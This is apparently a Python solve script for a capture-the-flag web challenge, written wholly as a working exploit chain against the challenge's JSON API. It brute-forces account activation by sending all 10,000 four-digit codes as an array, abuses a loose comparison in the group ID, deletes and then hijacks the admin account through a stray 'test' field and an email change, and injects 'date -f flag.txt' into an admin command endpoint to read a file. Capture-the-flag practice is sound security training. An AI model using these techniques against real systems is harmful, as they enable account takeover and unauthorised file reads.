import requests

s1 = requests.Session()

print("Creating account")
s1.post("https://b500c0bd44e0afd54abb2304-1024-cybercrime-society-club-germany.challenge.master.camp.allesctf.net:31337/json_api", json={
    "action": "create_account",
    "data": {
        "email": "info@example.com",
        "password": "whatever",
        "groupid": ".0E",
        "userid": "9998",
        "activation": ["{:0>4}".format(i) for i in range(10000)]
    }
})

print("Login")
s1.post("https://b500c0bd44e0afd54abb2304-1024-cybercrime-society-club-germany.challenge.master.camp.allesctf.net:31337/json_api", json={
    "action": "login",
    "data": {
        "email": "info@example.com",
        "password": "whatever"
    }
})

print("Delete admin")
s1.post("https://b500c0bd44e0afd54abb2304-1024-cybercrime-society-club-germany.challenge.master.camp.allesctf.net:31337/json_api", json={
    "action": "delete_account",
    "data": {
        "email": "info@example.com",
        "test": "admin@cscg.de"
    }
})


s2 = requests.Session()

print("Creating account again")
req1 = s2.post("https://b500c0bd44e0afd54abb2304-1024-cybercrime-society-club-germany.challenge.master.camp.allesctf.net:31337/json_api", json={
    "action": "create_account",
    "data": {
        "email": "info@example.com",
        "password": "whatever",
        "groupid": ".0E",
        "userid": "9998",
        "activation": ["{:0>4}".format(i) for i in range(10000)]
    }
})

print("Login")
s2.post("https://b500c0bd44e0afd54abb2304-1024-cybercrime-society-club-germany.challenge.master.camp.allesctf.net:31337/json_api", json={
    "action": "login",
    "data": {
        "email": "info@example.com",
        "password": "whatever"
    }
})

print("Change email to admin")
s2.post("https://b500c0bd44e0afd54abb2304-1024-cybercrime-society-club-germany.challenge.master.camp.allesctf.net:31337/json_api", json={
    "action": "edit_account",
    "data": {
        "email": "admin@cscg.de"
    }
})

print("Executing command")
r2 = s2.post("https://b500c0bd44e0afd54abb2304-1024-cybercrime-society-club-germany.challenge.master.camp.allesctf.net:31337/json_api", json={
    "action": "admin",
    "data": {
        "cmd": ["date", "-f", "flag.txt", "-u"]
    }
})

print(r2.json())